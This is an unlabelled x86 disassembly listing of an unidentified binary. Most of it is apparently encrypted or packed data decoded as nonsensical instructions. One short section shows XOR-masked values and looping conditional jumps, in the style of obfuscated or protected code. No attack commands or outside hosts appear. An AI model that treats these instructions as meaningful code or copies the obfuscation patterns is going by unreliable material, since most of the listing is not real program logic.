  417da1:	cmp    DWORD PTR [eax+0x2d09c24e],ebx
  417da7:	or     esi,DWORD PTR [edx+0x5b]
  417daa:	xchg   cl,ch
  417dac:	addr16 (bad) 
  417dae:	pop    ebp
  417daf:	and    al,0xfc
  417db1:	sbb    ch,ch
  417db3:	sbb    eax,0x1ccf87d1
  417db8:	test   DWORD PTR [eax-0x7408f157],edi
  417dbe:	dec    esp
  417dbf:	jnp    0x417d4a
  417dc1:	loopne 0x417d73
  417dc3:	data16 daa 
  417dc5:	outs   dx,DWORD PTR ds:[esi]
  417dc6:	and    eax,0xc53b0c40
  417dcb:	cwde   
  417dcc:	or     BYTE PTR [bx+si-0x4b],ch
  417dd0:	rol    BYTE PTR [edi+0x56bc3c1f],0x57
  417dd7:	test   eax,0xd7d10f11
  417ddc:	dec    esi
  417ddd:	push   ecx
  417dde:	ficom  DWORD PTR [ebp-0x38fe84f3]
  417de4:	and    esp,DWORD PTR es:[edx-0x46]
  417de8:	stc    
  417de9:	xor    cl,BYTE PTR [edx-0x7ee792b3]
  417def:	xor    ah,BYTE PTR [ebx+0x3b]
  417df2:	mov    edi,ebx
  417df4:	ret    0x939b
  417df7:	jmp    0x417e02
  417df9:	out    0x5,eax
  417dfb:	stos   BYTE PTR es:[edi],al
  417dfc:	xchg   edx,eax
  417dfd:	xor    eax,0xd44d69d4
  417e02:	xchg   esp,eax
  417e03:	imul   esp,DWORD PTR [ebp-0x606d8d25],0x5f
  417e0a:	add    edx,DWORD PTR [eax-0x4279a9b9]
  417e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e11:	cmp    esi,edi
  417e13:	pop    esp
  417e14:	push   ds
  417e15:	popa   
  417e16:	fistp  WORD PTR [eax]
  417e18:	xchg   ecx,eax
  417e19:	push   ebx
  417e1a:	xor    al,0x6
  417e1c:	mov    bh,0x9f
  417e1e:	sub    eax,ecx
  417e20:	push   esp
  417e21:	test   BYTE PTR ss:[edi],dh
  417e24:	in     eax,dx
  417e25:	or     bl,BYTE PTR [ebx+ecx*2-0x3]
  417e29:	xor    eax,0x393694f1
  417e2e:	(bad)  
  417e2f:	in     eax,dx
  417e30:	adc    al,0xf1
  417e32:	fdiv   QWORD PTR [ecx-0x1d]
  417e35:	(bad)  
  417e36:	retf   
  417e37:	les    edx,FWORD PTR [esi]
  417e39:	repz ja 0x417e5a
  417e3c:	lock inc edi
  417e3e:	pop    ebx
  417e3f:	mov    edi,0xb0c57963
  417e44:	cmp    esp,DWORD PTR [eax-0x767ccb03]
  417e4a:	aam    0xc0
  417e4c:	jle    0x417dcf
  417e4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e4f:	stos   DWORD PTR es:[edi],eax
  417e50:	push   0xd0638009
  417e55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e56:	cmc    
  417e57:	shl    DWORD PTR [eax-0x2fef962a],1
  417e5d:	iret   
  417e5e:	push   es
  417e5f:	jge    0x417ec3
  417e61:	xchg   edi,eax
  417e62:	cs or  al,0x42
  417e65:	lea    edx,[ebp+0x46816ab2]
  417e6b:	mov    edx,0xf1cb00c6
  417e71:	mov    dh,0x5e
  417e73:	mov    ebx,0xcaf4df32
  417e78:	cmc    
  417e79:	jnp    0x417eea
  417e7b:	fwait
  417e7c:	xchg   esp,eax
  417e7d:	fld    TBYTE PTR [bp+si]
  417e80:	sub    BYTE PTR [esi],cl
  417e82:	pop    ebx
  417e83:	(bad)  
  417e84:	out    dx,eax
  417e85:	repz sbb al,bh
  417e88:	and    al,0x1b
  417e8a:	jmp    0x417e5b
  417e8c:	ja     0x417e86
  417e8e:	les    ebp,FWORD PTR [edi]
  417e90:	xchg   ebx,eax
  417e91:	fcmovne st,st(5)
  417e93:	fbstp  TBYTE PTR [edx+0x72]
  417e96:	leave  
  417e97:	cmp    al,0x48
  417e99:	lahf   
  417e9a:	inc    ebx
  417e9b:	xor    ah,dh
  417e9d:	push   ebp
  417e9e:	fist   WORD PTR [ebx+0x32]
  417ea1:	lds    esp,FWORD PTR [edi+0x5d241ad0]
  417ea7:	add    DWORD PTR [esp+eiz*4+0x4006ed93],ecx
  417eae:	sub    eax,0xced4bbc5
  417eb3:	loope  0x417f08
  417eb5:	out    0x28,al
  417eb7:	xchg   edx,eax
  417eb8:	aas    
  417eb9:	shl    BYTE PTR [ebx+ebp*4+0x6d],1
  417ebd:	(bad)  
  417ebe:	fbld   TBYTE PTR [eax]
  417ec0:	xor    BYTE PTR [ecx+0x2c42d5ff],0x71
  417ec7:	imul   ebp,DWORD PTR [ebp+0x399ef6a8],0x7d
  417ece:	pop    edi
  417ecf:	jns    0x417eb4
  417ed1:	test   BYTE PTR [edi+0x32],0xc0
  417ed5:	jbe    0x417f04
  417ed7:	in     eax,0xda
  417ed9:	pop    esi
  417eda:	out    dx,al
  417edb:	inc    ecx
  417edc:	mov    bl,0x52
  417ede:	mov    bh,0xd8
  417ee0:	cmp    eax,0x6f962527
  417ee5:	nop
  417ee6:	sub    eax,0xf74ca486
  417eeb:	jecxz  0x417f37
  417eed:	shl    BYTE PTR [esi],1
  417eef:	dec    esi
  417ef0:	pop    ds
  417ef1:	push   ebp
  417ef2:	xor    DWORD PTR [esp+eax*4+0x250f6d91],edx
  417ef9:	sub    DWORD PTR [ebp+0x56],ebx
  417efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417efd:	scas   eax,DWORD PTR es:[edi]
  417efe:	fild   DWORD PTR [edx]
  417f00:	(bad)  
  417f01:	xor    al,0x79
  417f03:	and    eax,0xc0bec248
  417f08:	mov    esp,0x70c9b26a
  417f0d:	aam    0xc9
  417f0f:	inc    eax
  417f10:	lods   al,BYTE PTR ds:[esi]
  417f11:	mov    ah,0x6
  417f13:	inc    ebx
  417f14:	add    esp,DWORD PTR [ebp-0x316b1107]
  417f1a:	adc    al,0x9b
  417f1c:	dec    eax
  417f1d:	mov    ebp,0xe18a5582
  417f22:	test   DWORD PTR [ebx+0x6a],edi
  417f25:	xchg   esi,eax
  417f26:	in     eax,dx
  417f27:	sbb    ah,BYTE PTR [edx-0x1e]
  417f2a:	fcomi  st,st(4)
  417f2c:	add    DWORD PTR [eax-0x24bdd567],ecx
  417f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f33:	out    dx,al
  417f34:	and    DWORD PTR [esp+esi*1-0xa],ecx
  417f38:	pop    ss
  417f39:	push   es
  417f3a:	pop    esi
  417f3b:	les    ecx,FWORD PTR [edx+0x23]
  417f3e:	xor    esp,esi
  417f40:	shl    DWORD PTR [edx+0x7a],1
  417f43:	add    DWORD PTR [eax-0x40],ebx
  417f46:	pusha  
  417f47:	jmp    0x587b3aea
  417f4c:	sbb    ch,BYTE PTR [eax]
  417f4e:	xchg   ebp,eax
  417f4f:	jmp    0x726ff823
  417f54:	and    ah,BYTE PTR [edi-0x7c]
  417f57:	inc    edi
  417f58:	icebp  
  417f59:	inc    ebp
  417f5a:	rcl    DWORD PTR [esi+0x7630b703],cl
  417f60:	dec    ecx
  417f61:	pop    edi
  417f62:	mov    ds:0x38989901,al
  417f67:	int3   
  417f68:	daa    
  417f69:	enter  0x19bd,0x27
  417f6d:	mov    ch,ah
  417f6f:	inc    esi
  417f70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f71:	mov    ebp,0x1491f4c3
  417f76:	int3   
  417f77:	jb     0x417fc1
  417f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f7a:	lahf   
  417f7b:	mov    ch,0x2d
  417f7d:	pushf  
  417f7e:	hlt    
  417f7f:	pop    esi
  417f80:	retf   0xebae
  417f83:	aad    0x40
  417f85:	lods   al,BYTE PTR ds:[esi]
  417f86:	sti    
  417f87:	icebp  
  417f88:	pop    es
  417f89:	pop    eax
  417f8a:	xlat   BYTE PTR ds:[ebx]
  417f8b:	(bad)  
  417f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f8d:	inc    esp
  417f8e:	pop    esi
  417f8f:	out    dx,al
  417f90:	mov    eax,0x8b2a8e26
  417f95:	mov    BYTE PTR [esi+0x42],ch
  417f98:	pop    ebp
  417f99:	(bad)  
  417f9a:	sti    
  417f9b:	xor    eax,edi
  417f9d:	jp     0x417fca
  417f9f:	jnp    0x417f67
  417fa1:	dec    eax
  417fa2:	pop    ecx
  417fa3:	mul    BYTE PTR [ebx+0x786a63ee]
  417fa9:	cmp    al,0x22
  417fab:	jg     0x417f3a
  417fad:	mov    edx,0x68a92b9c
  417fb2:	dec    ecx
  417fb3:	nop
  417fb4:	nop
  417fb5:	sbb    ebx,esi
  417fb7:	mov    dh,0x20
  417fb9:	ja     0x417f69
  417fbb:	adc    al,0x60
  417fbd:	out    0xa8,al
  417fbf:	xlat   BYTE PTR ds:[ebx]
  417fc0:	inc    esp
  417fc1:	lea    ecx,[esi-0x6a0c4c74]
  417fc7:	mov    eax,DWORD PTR [ecx]
  417fc9:	and    BYTE PTR [edi],cl
  417fcb:	or     eax,0x798fca8b
  417fd0:	jmp    0xb5c5:0x40bda424
  417fd7:	inc    esi
  417fd8:	xchg   esi,eax
  417fd9:	push   ecx
  417fda:	mov    dh,0x2a
  417fdc:	sbb    ebp,DWORD PTR [ebx+0x14a7ffd1]
  417fe2:	iret   
  417fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fe4:	jge    0x41800a
  417fe6:	ret    0x8409
  417fe9:	or     al,0x46
  417feb:	jecxz  0x41803a
  417fed:	cmp    eax,0x1a4e1747
  417ff2:	into   
  417ff3:	mov    bh,BYTE PTR [esi]
  417ff5:	sahf   
  417ff6:	xor    al,0x32
  417ff8:	and    BYTE PTR [eax+ebx*8+0x29680fe4],ah
  417fff:	fstp   TBYTE PTR [eax+0x648d893e]
  418005:	mov    edx,0x88bbdf
  41800a:	test   BYTE PTR [edx-0x4f],al
  41800d:	sbb    bh,ch
  41800f:	xchg   ecx,eax
  418010:	push   ds
  418011:	aam    0x9e
  418013:	sub    BYTE PTR [eax],ch
  418015:	in     eax,dx
  418016:	inc    esp
  418017:	pandn  mm0,QWORD PTR [ecx-0x58c93a70]
  41801e:	call   0x4a17:0x4e215b0d
  418025:	xchg   ebp,eax
  418026:	jmp    0x5d852a3b
  41802b:	jmp    0xfba:0x46c591df
  418032:	lods   al,BYTE PTR ds:[esi]
  418033:	fwait
  418034:	in     al,0x84
  418036:	popf   
  418037:	rcr    bl,1
  418039:	scas   eax,DWORD PTR es:[edi]
  41803a:	sbb    esi,DWORD PTR [esi]
  41803c:	and    BYTE PTR [edi-0xfb28c6a],ah
  418042:	pop    eax
  418043:	popa   
  418044:	jno    0x418070
  418046:	ror    BYTE PTR [ebp+0x35],1
  418049:	add    al,0x58
  41804b:	ja     0x4180ab
  41804d:	fwait
  41804e:	dec    ecx
  41804f:	push   ebx
  418050:	pop    esi
  418051:	repz xor al,dh
  418054:	fcom   QWORD PTR [ecx+0x55]
  418057:	jge    0x4180bc
  418059:	out    0x2c,al
  41805b:	dec    ebx
  41805c:	mov    ah,0x86
  41805e:	xlat   BYTE PTR ds:[ebx]
  41805f:	push   eax
  418060:	lds    eax,FWORD PTR ds:0x339f24d3
  418066:	cmc    
  418067:	jg     0x418048
  418069:	cwde   
  41806a:	popa   
  41806b:	outs   dx,DWORD PTR ds:[esi]
  41806c:	and    ah,dh
  41806e:	mov    WORD PTR [ebx-0x35d967ad],ds
  418074:	push   es
  418075:	not    BYTE PTR [edi-0x64]
  418078:	out    dx,al
  418079:	adc    DWORD PTR [eax+0x53c9cd6f],0x6a20fbd0
  418083:	ds es jb 0x4180a8
  418087:	lea    edx,[eax]
  418089:	add    al,0xda
  41808b:	ss ins DWORD PTR es:[edi],dx
  41808d:	mov    edi,0x79cc2a2e
  418092:	lods   eax,DWORD PTR ds:[esi]
  418093:	shl    BYTE PTR [ebp+edi*2-0x24],cl
  418097:	and    al,0x15
  418099:	shl    DWORD PTR [edi],1
  41809b:	jbe    0x4180a3
  41809d:	and    al,0xbf
  41809f:	jb     0x4180a4
  4180a1:	jbe    0x41804a
  4180a3:	xchg   BYTE PTR [edx-0x1d053611],ah
  4180a9:	xchg   ebx,eax
  4180aa:	icebp  
  4180ab:	repz test BYTE PTR [esp+edx*2],ah
  4180af:	(bad)  
  4180b0:	push   edi
  4180b1:	pushf  
  4180b2:	sub    DWORD PTR [esi+esi*1],edi
  4180b5:	sub    BYTE PTR [ebx-0x19b742eb],ch
  4180bb:	cmc    
  4180bc:	mov    al,ds:0xb68ad23a
  4180c1:	xor    dl,BYTE PTR [esi-0x2f]
  4180c4:	xor    eax,0xefbc57b7
  4180c9:	and    DWORD PTR [ebx+esi*8-0x197af472],0xffffffc3
  4180d1:	mov    esi,0x86d79083
  4180d6:	mov    eax,ds:0x6632c570
  4180db:	xor    dh,BYTE PTR [edi]
  4180dd:	push   edx
  4180de:	push   es
  4180df:	dec    esp
  4180e0:	pop    ss
  4180e1:	xchg   esi,eax
  4180e2:	jmp    0x418123
  4180e4:	rcl    DWORD PTR [ecx+esi*8+0x34],cl
  4180e8:	fisub  WORD PTR [eax+0x292e94da]
  4180ee:	push   esi
  4180ef:	ret    
  4180f0:	add    al,0xf8
  4180f2:	add    DWORD PTR [ecx+0x1e],0x74
  4180f6:	test   DWORD PTR [eax+0x7],edx
  4180f9:	mov    esp,0xa0c04748
  4180fe:	add    ebp,DWORD PTR [edx]
  418100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418101:	xor    ch,bh
  418103:	ret    
  418104:	sub    esp,ebp
  418106:	xchg   cl,dh
  418108:	sbb    ecx,eax
  41810a:	fwait
  41810b:	dec    ebx
  41810c:	xor    bh,BYTE PTR [ecx+0x30]
  41810f:	mov    edi,0xf2957467
  418114:	mov    ds:0xfa123f8,al
  418119:	dec    ecx
  41811a:	sub    DWORD PTR [edi-0x7f],esp
  41811d:	lds    eax,FWORD PTR [ebx-0x78]
  418120:	xor    al,BYTE PTR [ebx+0x79d4c2f3]
  418126:	dec    ebp
  418127:	lea    edi,[esi+0x7973e4c2]
  41812d:	lahf   
  41812e:	aaa    
  41812f:	nop
  418130:	dec    ebx
  418131:	and    BYTE PTR [eax-0x3886d805],bl
  418137:	inc    edi
  418138:	into   
  418139:	mov    ch,0x40
  41813b:	iret   
  41813c:	loop   0x418126
  41813e:	(bad)  
  41813f:	jmp    0x131c:0xe189e1cd
  418146:	fcmovu st,st(7)
  418148:	dec    ebx
  418149:	jl     0x4180cf
  41814b:	ja     0x41818e
  41814d:	push   esi
  41814e:	jae    0x4181b6
  418150:	(bad)
  418155:	mov    cl,BYTE PTR [edx]
  418157:	punpckhdq mm3,QWORD PTR [ebx+0x115760ca]
  41815e:	xchg   eax,esi
  418160:	icebp  
  418161:	jmp    0xd7053c60
  418166:	cmp    al,0xf6
  418168:	fsub   DWORD PTR [esi-0x23bbd420]
  41816e:	cmp    ebp,ecx
  418170:	(bad)  
  418171:	(bad)  
  418172:	xchg   edi,eax
  418173:	inc    ecx
  418174:	adc    DWORD PTR [esi-0x78],esp
  418177:	test   eax,0x2fe3aa48
  41817c:	mov    ?,WORD PTR [esi-0x2f763fe5]
  418182:	mov    al,ds:0xdab10dee
  418187:	icebp  
  418188:	xor    eax,0x680a4f52
  41818d:	dec    ebx
  41818e:	outs   dx,DWORD PTR ds:[esi]
  41818f:	into   
  418190:	outs   dx,DWORD PTR ds:[esi]
  418191:	(bad)  
  418192:	jmp    0xfb7282a0
  418197:	push   eax
  418198:	lods   al,BYTE PTR ds:[esi]
  418199:	ds loop 0x4181b7
  41819c:	cmp    dh,BYTE PTR [edi+0x5c80cf6d]
  4181a2:	in     al,0xf1
  4181a4:	repz aaa 
  4181a6:	mov    dh,0x1a
  4181a8:	cmp    edx,edi
  4181aa:	retf   0x232
  4181ad:	mov    ah,0x71
  4181af:	add    dl,dh
  4181b1:	xchg   edi,eax
  4181b2:	fcomp  st(2)
  4181b4:	ret    0x4c3b
  4181b7:	jge    0x41819d
  4181b9:	bswap  edx
  4181bb:	cmp    BYTE PTR [esi-0x2e],0xa
  4181bf:	push   0xffffffc7
  4181c1:	jle    0x418212
  4181c3:	cmp    eax,esi
  4181c5:	mov    edx,0x1bd959ac
  4181ca:	inc    ebp
  4181cb:	icebp  
  4181cc:	jecxz  0x418233
  4181ce:	nop
  4181cf:	scas   al,BYTE PTR es:[edi]
  4181d0:	or     al,0x87
  4181d2:	sbb    BYTE PTR [ebx-0x63],al
  4181d5:	push   esi
  4181d6:	int3   
  4181d7:	cli    
  4181d8:	rcl    ecx,1
  4181da:	(bad)  
  4181db:	fucomp st(2)
  4181dd:	sub    BYTE PTR [edx-0x4a7fde4b],dl
  4181e3:	rcl    WORD PTR [ecx],cl
  4181e6:	mov    ecx,0x4a414b6f
  4181eb:	enter  0xb68e,0x62
  4181ef:	into   
  4181f0:	push   edx
  4181f1:	or     DWORD PTR [edi-0x47007ceb],edx
  4181f7:	mov    edi,0x90930381
  4181fc:	dec    eax
  4181fd:	mov    eax,ds:0x722d23b9
  418202:	push   ds
  418203:	out    0xa5,eax
  418205:	push   ebx
  418206:	or     al,BYTE PTR [ebx-0x4c]
  418209:	push   edx
  41820a:	sbb    bl,bh
  41820c:	mov    ds:0xff55da01,al
  418211:	ins    BYTE PTR es:[edi],dx
  418212:	mov    fs,WORD PTR [esi+0x3695b33d]
  418218:	rcr    BYTE PTR [edx],cl
  41821a:	xchg   DWORD PTR [edx],esi
  41821c:	adc    esp,DWORD PTR [ebp*2+0x6a0dc407]
  418223:	aam    0xea
  418225:	mov    ah,0x7b
  418227:	dec    ebp
  418228:	icebp  
  418229:	and    eax,0x32accf79
  41822e:	mov    DWORD PTR [eax],ebx
  418230:	ds scas eax,DWORD PTR es:[edi]
  418232:	out    dx,eax
  418233:	cmp    al,0x56
  418235:	ins    DWORD PTR es:[edi],dx
  418236:	xchg   edi,eax
  418237:	push   es
  418238:	stos   BYTE PTR es:[edi],al
  418239:	cmp    ecx,DWORD PTR [esi-0x2ff1e314]
  41823f:	mov    edi,0xea2c35cf
  418244:	loop   0x418257
  418246:	test   DWORD PTR [eax-0x6ca9255f],ebx
  41824c:	fistp  WORD PTR [edx]
  41824e:	mov    ds:0xf9ed36ef,eax
  418253:	sub    al,0x99
  418255:	repnz mov dl,cl
  418258:	fisttp WORD PTR [esi+ebx*2-0x5f]
  41825c:	xor    edx,DWORD PTR ds:0x2503
  418261:	out    0xc3,al
  418263:	xchg   ecx,eax
  418264:	into   
  418265:	pushf  
  418266:	repnz pop es
  418268:	icebp  
  418269:	or     BYTE PTR [esi+ecx*8],cl
  41826c:	mov    bl,BYTE PTR [edi-0x6d]
  41826f:	and    eax,0xd25165af
  418274:	icebp  
  418275:	jne    0x4182d1
  418277:	mov    eax,0x6eed79ed
  41827c:	hlt    
  41827d:	adc    al,0xb
  41827f:	nop
  418280:	cmp    DWORD PTR [esp+esi*8],ebp
  418283:	not    DWORD PTR [esi]
  418285:	pushf  
  418286:	mov    BYTE PTR [esi+0x2ac2323],0xf6
  41828d:	or     esp,DWORD PTR [edi-0x1]
  418290:	push   esi
  418291:	and    DWORD PTR [eax-0x6b],edx
  418294:	or     eax,0x510f592a
  418299:	sbb    dh,BYTE PTR cs:[ecx]
  41829c:	outs   dx,DWORD PTR ds:[esi]
  41829d:	xchg   ebx,eax
  41829e:	push   0x6b
  4182a0:	mov    eax,0xdff3b2e6
  4182a5:	push   ebx
  4182a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182a7:	mov    DWORD PTR ds:0xcf1bfc02,eax
  4182ad:	sahf   
  4182ae:	jmp    0x572b:0xf9ce417d
  4182b5:	fsubr  DWORD PTR [edx+0x229b9dd4]
  4182bb:	ret    0x7267
  4182be:	lahf   
  4182bf:	aad    0xf5
  4182c1:	or     DWORD PTR ds:0x16ce0711,0xaa2f5aa4
  4182cb:	jmp    0x35d1:0xa6d27f2b
  4182d2:	shr    BYTE PTR [eax],0x11
  4182d5:	dec    edi
  4182d6:	push   esp
  4182d7:	hlt    
  4182d8:	dec    ecx
  4182d9:	(bad)  
  4182da:	fcom   DWORD PTR [eax+0x23]
  4182dd:	fmul   st(6),st
  4182df:	ret    0x4b7c
  4182e2:	pop    ds
  4182e3:	arpl   sp,di
  4182e5:	je     0x4182ea
  4182e7:	jne    0x418342
  4182e9:	stos   DWORD PTR es:[edi],eax
  4182ea:	sbb    eax,0x96043075
  4182ef:	loopne 0x418324
  4182f1:	mov    DWORD PTR [ebx],esi
  4182f3:	nop
  4182f4:	fld    QWORD PTR [esi+0x133c22c0]
  4182fa:	xchg   esp,eax
  4182fb:	(bad)  
  4182fc:	push   esi
  4182fd:	scas   al,BYTE PTR es:[edi]
  4182fe:	aas    
  4182ff:	jbe    0x418299
  418301:	ins    BYTE PTR es:[edi],dx
  418302:	cli    
  418303:	jp     0x199ac388
  418309:	jae    0x41834e
  41830b:	(bad)  [eax]
  41830d:	inc    ecx
  41830e:	xchg   ecx,eax
  41830f:	cdq    
  418310:	xchg   esp,eax
  418311:	(bad)  
  418313:	sbb    ah,bl
  418315:	sub    al,0xf0
  418317:	lods   al,BYTE PTR ds:[esi]
  418318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418319:	shl    dl,cl
  41831b:	rcl    ebx,1
  41831d:	repz jo 0x4182b5
  418320:	mov    esi,0x84774b80
  418325:	fnstsw WORD PTR [ebx-0x55aed736]
  41832b:	sbb    esp,DWORD PTR [esi]
  41832d:	std    
  41832e:	adc    dl,BYTE PTR [ebx+0x49f6769d]
  418334:	xlat   BYTE PTR ds:[ebx]
  418335:	mov    ebp,0xd1d7bed5
  41833a:	jno    0x4182dd
  41833c:	bound  ebx,QWORD PTR [esi-0x52eee4fb]
  418342:	or     al,0xec
  418344:	inc    ecx
  418345:	lods   eax,DWORD PTR ds:[esi]
  418346:	in     al,0xb4
  418348:	mov    cl,0xf2
  41834a:	ins    BYTE PTR es:[edi],dx
  41834b:	sub    DWORD PTR [ebx],0x2bbe498d
  418351:	lock push ecx
  418353:	imul   esi,DWORD PTR [edx-0xda01bc9],0xe88075f4
  41835d:	xor    DWORD PTR [ebx-0x76],ebx
  418360:	je     0x4183c9
  418362:	cmp    esp,DWORD PTR [esi-0x71eaa1ac]
  418368:	leave  
  418369:	jle    0x41834e
  41836b:	or     BYTE PTR [ecx],bh
  41836d:	in     al,dx
  41836e:	dec    edx
  41836f:	ds stc 
  418371:	adc    DWORD PTR [esi+0xccc69de],esi
  418377:	mov    bl,0x7a
  418379:	mov    eax,ds:0x5b4cba6d
  41837e:	ins    DWORD PTR es:[edi],dx
  41837f:	cmp    bl,BYTE PTR [ebp+0x19622af6]
  418385:	out    dx,eax
  418386:	in     eax,dx
  418387:	jne    0x413c7e
  41838d:	mov    edx,DWORD PTR [ebp-0xc]
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	dec    ebp
  41848c:	push   esi
  41848d:	sbb    DWORD PTR [esi+0x7c7d30cc],esp
  418493:	inc    eax
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	ret    
  418498:	sar    ebx,1
  41849a:	inc    esi
  41849b:	sbb    esp,DWORD PTR [edx-0x63]
  41849e:	(bad)  
  4184a0:	fwait
  4184a1:	pusha  
  4184a2:	outs   dx,DWORD PTR ds:[esi]
  4184a3:	xchg   al,al
  4184a5:	or     DWORD PTR [ecx],eax
  4184a7:	pop    eax
  4184a8:	rcr    edi,0xbb
  4184ab:	shr    DWORD PTR [edi+0x34],0xc7
  4184af:	fistp  WORD PTR [esi+eiz*4-0x4a7977ee]
  4184b6:	mov    esi,0xbd320b1e
  4184bb:	repz push esi
  4184bd:	imul   BYTE PTR [edi-0x65]
  4184c0:	sub    ebx,ebp
  4184c2:	arpl   WORD PTR [esi-0x6d],bx
  4184c5:	sbb    BYTE PTR [ecx+0x6b],ch
  4184c8:	pushf  
  4184c9:	gs push 0x6f
  4184cc:	sub    al,0x3b
  4184ce:	adc    al,0xc0
  4184d0:	mov    ebp,edi
  4184d2:	pushf  
  4184d3:	fadd   st,st(1)
  4184d5:	xchg   ecx,eax
  4184d6:	arpl   WORD PTR [ebp-0x52],cx
  4184d9:	add    al,0x34
  4184db:	adc    eax,0x868e681f
  4184e0:	clc    
  4184e1:	mov    ebp,DWORD PTR [eax+0x57d64048]
  4184e7:	lahf   
  4184e8:	or     dh,bh
  4184ea:	pop    eax
  4184eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184ec:	not    ch
  4184ee:	push   ss
  4184ef:	and    eax,0x6fd8a459
  4184f4:	mov    dh,0x8f
  4184f6:	lds    ecx,FWORD PTR [edi-0x3a57e50c]
  4184fc:	inc    eax
  4184fd:	ins    DWORD PTR es:[edi],dx
  4184fe:	jecxz  0x418525
  418500:	jbe    0x41854c
  418502:	fwait
  418503:	shr    esi,cl
  418505:	sub    DWORD PTR [ecx-0x2c],esi
  418508:	hlt    
  418509:	push   eax
  41850a:	mov    eax,ds:0x18da12c4
  41850f:	pop    ebp
  418510:	xchg   ecx,eax
  418511:	out    0x4,al
  418513:	stos   DWORD PTR es:[edi],eax
  418514:	icebp  
  418515:	aad    0x86
  418517:	aas    
  418518:	add    BYTE PTR [esi-0x8c5b07c],ch
  41851e:	ins    BYTE PTR es:[edi],dx
  41851f:	add    al,0xfe
  418521:	lea    esi,[esi]
  418523:	adc    eax,DWORD PTR [eax+0x5a]
  418526:	adc    ebx,DWORD PTR ds:0xf7e34761
  41852c:	xor    cl,al
  41852e:	jmp    0xaf87:0x72d03d00
  418535:	daa    
  418536:	mov    DWORD PTR [edi+edi*1+0x62],ebx
  41853a:	scas   eax,DWORD PTR es:[edi]
  41853b:	je     0x418543
  41853d:	or     DWORD PTR [ecx-0x19],eax
  418540:	pusha  
  418541:	push   es
  418542:	ror    bl,1
  418544:	js     0x418589
  418546:	cmp    cl,BYTE PTR [edx+0x7ba00924]
  41854c:	jnp    0x418588
  41854e:	mov    eax,?
  418550:	hlt    
  418551:	rcr    BYTE PTR [ebp+0x577b04e],1
  418557:	in     eax,dx
  418558:	(bad)  
  418559:	clc    
  41855a:	and    bh,cl
  41855c:	int    0xce
  41855e:	sbb    esp,edx
  418560:	xchg   esp,eax
